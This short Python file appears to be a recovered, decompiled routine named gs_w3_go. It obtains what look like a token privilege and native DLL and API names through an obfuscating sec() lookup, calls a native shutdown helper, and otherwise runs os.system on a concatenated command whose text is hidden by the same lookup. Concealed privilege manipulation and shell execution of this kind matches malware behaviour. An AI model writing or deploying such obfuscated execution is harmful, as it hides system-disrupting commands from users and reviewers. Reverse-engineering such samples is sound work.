"""Recovered zero-argument entry ``gs_w3_go``.

Decompiled structure: token-privilege setup followed by
``os.system(sec(...) + sec(...))``.
"""
from __future__ import annotations

import os

from ..link._fds_jm import sec
from . import _ops


def gs_w3_go() -> None:
    _priv = sec("fg_vn_9c")
    _dll_a = sec("gh_wo_4r")
    _dll_k = sec("hi_xp_7m")
    _dll_u = sec("ij_yq_0b")
    _api = sec("jk_zr_3t")
    _primed = _ops.shutdown_native(_dll_a, _dll_k, _priv, _dll_u, _api)
    if not _primed:
        _os = os
        _line = sec("zp_uq_6n") + sec("hm_xd_3k")
        _os.system(_line)

